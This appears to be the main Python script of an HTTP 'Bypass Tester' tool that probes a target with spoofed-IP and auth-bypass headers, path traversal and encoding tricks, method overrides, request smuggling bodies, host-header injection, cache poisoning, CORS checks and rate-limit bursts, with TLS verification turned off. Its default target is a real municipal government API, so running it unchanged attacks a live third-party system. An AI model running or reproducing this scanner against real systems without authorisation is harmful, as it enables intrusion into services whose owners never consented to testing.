#!/usr/bin/env python3
from __future__ import annotations
import sys
import os
import argparse
import json
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, UTC
from urllib.parse import quote

CONFIG = {
    "threads": 10,
    "delay": 0,
    "retries": 1,
    "timeout": 7,
}

sys.path.insert(0, os.path.dirname(__file__))

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from payloads.header_payloads import (
    IP_SPOOF_HEADERS,
    AUTH_BYPASS_HEADERS,
    CONTENT_TYPE_HEADERS,
    MISC_BYPASS_HEADERS,
)
from payloads.path_payloads import PATH_BYPASS, EXTENSION_BYPASS
from payloads.all_payloads import (
    HTTP_METHODS,
    METHOD_OVERRIDE_HEADERS,
    PARAM_POLLUTION,
    QUERY_MANIPULATION,
    JSON_INJECTION,
    JSON_FUZZ_STRINGS,
    SMUGGLING_HEADERS,
    SMUGGLING_BODY_CLTE,
    SMUGGLING_BODY_TECL,
    HOST_HEADER_PAYLOADS,
    HOST_HEADER_INJECTION_VARIANTS,
    RATE_LIMIT_HEADERS,
    RATE_LIMIT_PATHS,
    CACHE_POISON_HEADERS,
    CACHE_BUSTER_PARAMS,
    CORS_HEADERS,
    CORS_ORIGINS,
    DOUBLE_ENCODING,
)

from modules.query_injection_test import query_injection_test
from modules.host_header_test import host_header_test
from modules.rate_limit_test import rate_limit_test
from modules.json_fuzz_test import json_fuzz_test


def _req(
    url: str,
    method: str = "GET",
    headers: dict = None,
    body=None,
    raw_body: str = None,
    timeout: int = None,
) -> dict:

    timeout = timeout or CONFIG["timeout"]
    result = {"status": "ERR", "length": 0, "headers": {}, "snippet": "no attempts made"}

    for attempt in range(CONFIG["retries"] + 1):
        try:
            if CONFIG["delay"] > 0:
                time.sleep(CONFIG["delay"])

            kwargs = dict(
                headers=headers or {},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )

            if raw_body is not None:
                kwargs["data"] = raw_body
            elif body is not None:
                kwargs["json"] = body

            r = requests.request(method, url, **kwargs)

            return {
                "status": r.status_code,
                "length": len(r.text),
                "headers": dict(r.headers),
                "snippet": r.text[:200],
            }

        except requests.exceptions.Timeout:
            result = {"status": "TIMEOUT", "length": 0, "headers": {}, "snippet": ""}
        except Exception as e:
            result = {"status": "ERR", "length": 0, "headers": {}, "snippet": str(e)}

    return result


def fmt(res: dict) -> str:
    return f"[{res['status']}] {res['length']} bytes"


def header_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: HEADER BYPASS")
    print("=" * 60)

    groups = [
        ("IP Spoof", IP_SPOOF_HEADERS),
        ("Auth Bypass", AUTH_BYPASS_HEADERS),
        ("Content-Type", CONTENT_TYPE_HEADERS),
        ("Misc Bypass", MISC_BYPASS_HEADERS),
    ]
    for group_name, hdrs in groups:
        print(f"\n[{group_name}]")
        for h in hdrs:
            res = _req(base_url, headers=h)
            label = ", ".join(f"{k}: {v}" for k, v in h.items())
            print(f"  {label[:60]:<60} -> {fmt(res)}")
            results.append({"group": group_name, "headers": h, **res})
    return results


def path_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: PATH BYPASS")
    print("=" * 60)

    print("\n[Path Traversal / Encoding]")
    for p in PATH_BYPASS:
        url = base_url.rstrip("/") + p
        res = _req(url)
        print(f"  {url[:70]:<70} -> {fmt(res)}")
        results.append({"type": "path", "url": url, **res})

    print("\n[Extension Bypass]")
    for ext in EXTENSION_BYPASS:
        url = base_url.rstrip("/") + ext
        res = _req(url)
        print(f"  {url[:70]:<70} -> {fmt(res)}")
        results.append({"type": "extension", "url": url, **res})

    return results


def method_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: METHOD CONFUSION")
    print("=" * 60)

    print("\n[HTTP Methods]")
    for m in HTTP_METHODS:
        res = _req(base_url, method=m)
        print(f"  {m:<12} -> {fmt(res)}")
        results.append({"type": "method", "method": m, **res})

    print("\n[Method Override Headers]")
    for h in METHOD_OVERRIDE_HEADERS:
        res = _req(base_url, headers=h)
        label = ", ".join(f"{k}: {v}" for k, v in h.items())
        print(f"  {label:<50} -> {fmt(res)}")
        results.append({"type": "override", "headers": h, **res})

    return results


def param_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: PARAMETER POLLUTION")
    print("=" * 60)

    for param in PARAM_POLLUTION:
        url = base_url.rstrip("/") + param
        res = _req(url)
        print(f"  {param:<45} -> {fmt(res)}")
        results.append({"type": "pollution", "url": url, **res})

    return results


def smuggling_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: HTTP REQUEST SMUGGLING")
    print("=" * 60)

    print("\n[Smuggling Header Variations]")
    for hdr in SMUGGLING_HEADERS:
        label = ", ".join(f"{k}: {v}" for k, v in hdr.items())
        res = _req(base_url, method="POST", headers=hdr, raw_body=SMUGGLING_BODY_CLTE)
        print(f"  {label[:60]:<60} -> {fmt(res)}")
        results.append({"type": "smuggling_headers", "headers": hdr, **res})

    print("\n[CL.TE Body]")
    for hdr in SMUGGLING_HEADERS[:4]:
        res = _req(base_url, method="POST", headers=hdr, raw_body=SMUGGLING_BODY_CLTE)
        label = list(hdr.keys())[0]
        print(f"  CL.TE | {label:<40} -> {fmt(res)}")
        results.append({"type": "clte", "headers": hdr, **res})

    print("\n[TE.CL Body]")
    for hdr in SMUGGLING_HEADERS[:4]:
        res = _req(base_url, method="POST", headers=hdr, raw_body=SMUGGLING_BODY_TECL)
        label = list(hdr.keys())[0]
        print(f"  TE.CL | {label:<40} -> {fmt(res)}")
        results.append({"type": "tecl", "headers": hdr, **res})

    return results


def cors_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: CORS EXPLOITATION")
    print("=" * 60)

    for hdr_dict in CORS_HEADERS:
        preflight_hdrs = {**hdr_dict, "Access-Control-Request-Method": "GET"}
        res_pre = _req(base_url, method="OPTIONS", headers=preflight_hdrs)
        acao = res_pre["headers"].get("Access-Control-Allow-Origin", "")
        acac = res_pre["headers"].get("Access-Control-Allow-Credentials", "")

        res_act = _req(base_url, headers=hdr_dict)
        acao_act = res_act["headers"].get("Access-Control-Allow-Origin", "")

        origin_val = hdr_dict.get("Origin", "(no origin)")
        vuln = ""
        if acao_act and acao_act != "null":
            if origin_val in acao_act or acao_act == "*":
                vuln = "⚠ CORS REFLECTED"
        if acac.lower() == "true" and acao_act not in ("*", ""):
            vuln += " + CREDENTIALS"

        label = f"Origin: {origin_val}"
        print(f"  PRE {fmt(res_pre)} | ACT {fmt(res_act)} | ACAO={acao_act or '-'} {vuln}")
        print(f"      {label}")
        results.append(
            {
                "type": "cors",
                "origin": origin_val,
                "acao": acao_act,
                "acac": acac,
                "vuln_flag": vuln,
                **res_act,
            }
        )

    return results


def cache_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: CACHE POISONING")
    print("=" * 60)

    print("\n[Poison Headers]")
    for hdr in CACHE_POISON_HEADERS:
        res = _req(base_url, headers=hdr)
        label = ", ".join(f"{k}: {v}" for k, v in hdr.items())
        age = res["headers"].get("Age", "")
        cc = res["headers"].get("Cache-Control", "")
        print(f"  {label[:55]:<55} -> {fmt(res)} Age={age} CC={cc}")
        results.append({"type": "cache_hdr", "headers": hdr, **res})

    print("\n[Cache Buster Params]")
    for p in CACHE_BUSTER_PARAMS:
        url = base_url.rstrip("/") + p
        res = _req(url)
        age = res["headers"].get("Age", "")
        print(f"  {p:<30} -> {fmt(res)} Age={age}")
        results.append({"type": "cache_bust", "url": url, **res})

    return results


def encoding_tests(base_url: str) -> list[dict]:
    results = []
    print("\n" + "=" * 60)
    print("  TEST: DOUBLE ENCODING BYPASS")
    print("=" * 60)

    for enc in DOUBLE_ENCODING:
        url = base_url.rstrip("/") + "/" + enc
        res = _req(url)
        print(f"  {enc:<40} -> {fmt(res)}")
        results.append({"type": "double_enc", "url": url, **res})

    return results


def _build_report(all_results: dict, base_url: str) -> dict:
    report = {
        "target": base_url,
        "timestamp": datetime.now(UTC).isoformat() + "Z",
        "summary": {},
        "findings": [],
        "results": all_results,
    }
    interesting_statuses = {200, 201, 204, 301, 302, 307, 401, 403, 500}
    for module_name, results in all_results.items():
        hits = [r for r in results if r.get("status") in interesting_statuses]
        report["summary"][module_name] = {
            "total": len(results),
            "interesting": len(hits),
        }
        for r in hits:
            if r.get("status") == 500:
                report["findings"].append(
                    {
                        "severity": "HIGH",
                        "module": module_name,
                        "detail": str(r),
                    }
                )
            elif r.get("vuln_flag"):
                report["findings"].append(
                    {
                        "severity": "MEDIUM",
                        "module": module_name,
                        "detail": str(r),
                    }
                )
    return report


def _save_report(report: dict, path: str):
    with open(path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"\n📄 Report saved -> {path}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Bypass Tester — Advanced Security Testing Suite",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "url",
        nargs="?",
        default="https://api-jdih.sukabumikota.go.id/databases/1",
        help="Target URL (default: %(default)s)",
    )
    parser.add_argument(
        "--modules",
        "-m",
        nargs="+",
        choices=[
            "all", "headers", "paths", "methods", "params",
            "query", "json", "smuggling", "host",
            "ratelimit", "cache", "cors", "encoding",
        ],
        default=["all"],
        help="Select modules to run (default: all)",
    )
    parser.add_argument(
        "--output", "-o", default=None, help="Save results to JSON file (optional)"
    )
    parser.add_argument(
        "--timeout", "-t", type=int, default=7,
        help="Per-request timeout in seconds (default: 7)",
    )
    parser.add_argument(
        "--burst", "-b", type=int, default=15,
        help="Number of concurrent requests for rate-limit test",
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Show extra details"
    )
    parser.add_argument(
        "--threads", type=int, default=10, help="Thread count (default: 10)"
    )
    parser.add_argument(
        "--delay", type=float, default=0, help="Delay between requests in seconds"
    )
    parser.add_argument("--retries", type=int, default=1, help="Retry count on failure")

    return parser.parse_args()


BANNER = r"""

     ▄▄▄     ▄▄▄▄     ▄▄▄▄▄              ▄▄▄▄▄▄
    ▄███    ██▀▀██   █▀▀▀▀██▄            ██▀▀▀▀██
   █▀ ██   ██    ██       ▄██            ██    ██  ▀██  ███  ██▄███▄    ▄█████▄  ▄▄█████▄  ▄▄█████▄
 ▄█▀  ██   ██ ██ ██    █████             ███████    ██▄ ██   ██▀  ▀██   ▀ ▄▄▄██  ██▄▄▄▄ ▀  ██▄▄▄▄
 ████████  ██    ██       ▀██            ██    ██    ████▀   ██    ██  ▄██▀▀▀██   ▀▀▀▀██▄   ▀▀▀▀██▄
      ██    ██▄▄██   █▄▄▄▄██▀            ██▄▄▄▄██     ███    ███▄▄██▀  ██▄▄▄███  █▄▄▄▄▄██  █▄▄▄▄▄██
      ▀▀     ▀▀▀▀     ▀▀▀▀▀              ▀▀▀▀▀▀▀      ██     ██ ▀▀▀     ▀▀▀▀ ▀▀   ▀▀▀▀▀▀    ▀▀▀▀▀▀
 ---By Lampros On Github  !                         ███      █
"""


def main():
    args = parse_args()
    base_url = args.url.rstrip("/")
    run_all = "all" in args.modules

    print(BANNER)
    print(f"🎯 Target  : {base_url}")
    print(f"⏱  Timeout : {args.timeout}s")
    print(f"📦 Modules : {', '.join(args.modules)}")
    print(f"🕒 Started : {datetime.now(UTC).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print("─" * 62)

    start = time.time()
    all_results: dict[str, list] = {}
    CONFIG["threads"] = args.threads
    CONFIG["delay"] = args.delay
    CONFIG["retries"] = args.retries
    CONFIG["timeout"] = args.timeout

    if run_all or "headers" in args.modules:
        all_results["headers"] = header_tests(base_url)

    if run_all or "paths" in args.modules:
        all_results["paths"] = path_tests(base_url)

    if run_all or "methods" in args.modules:
        all_results["methods"] = method_tests(base_url)

    if run_all or "params" in args.modules:
        all_results["params"] = param_tests(base_url)

    if run_all or "query" in args.modules:
        all_results["query"] = query_injection_test(base_url, verbose=args.verbose)

    if run_all or "json" in args.modules:
        all_results["json"] = json_fuzz_test(base_url, verbose=args.verbose)

    if run_all or "smuggling" in args.modules:
        all_results["smuggling"] = smuggling_tests(base_url)

    if run_all or "host" in args.modules:
        all_results["host"] = host_header_test(base_url, verbose=args.verbose)

    if run_all or "ratelimit" in args.modules:
        all_results["ratelimit"] = rate_limit_test(
            base_url, burst=args.burst, verbose=args.verbose
        )

    if run_all or "cache" in args.modules:
        all_results["cache"] = cache_tests(base_url)

    if run_all or "cors" in args.modules:
        all_results["cors"] = cors_tests(base_url)

    if run_all or "encoding" in args.modules:
        all_results["encoding"] = encoding_tests(base_url)

    elapsed = time.time() - start
    total = sum(len(v) for v in all_results.values())

    print("\n" + "═" * 62)
    print("  SUMMARY")
    print("═" * 62)
    for mod, res in all_results.items():
        hits = [r for r in res if r.get("status") not in (404, "ERR", "TIMEOUT")]
        print(f"  {mod:<15} {len(res):>4} req | {len(hits):>4} interesting")
    print(f"\n  Total    : {total} requests in {elapsed:.1f}s")

    report = _build_report(all_results, base_url)
    if report["findings"]:
        print(f"\n⚠  FINDINGS ({len(report['findings'])} items):")
        for f in report["findings"]:
            print(f"  [{f['severity']}] {f['module']} — {str(f['detail'])[:80]}")

    if args.output:
        _save_report(report, args.output)

    print("\n✅ Bypass Tester successfully completed.\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⛔ Stopped by user! ")
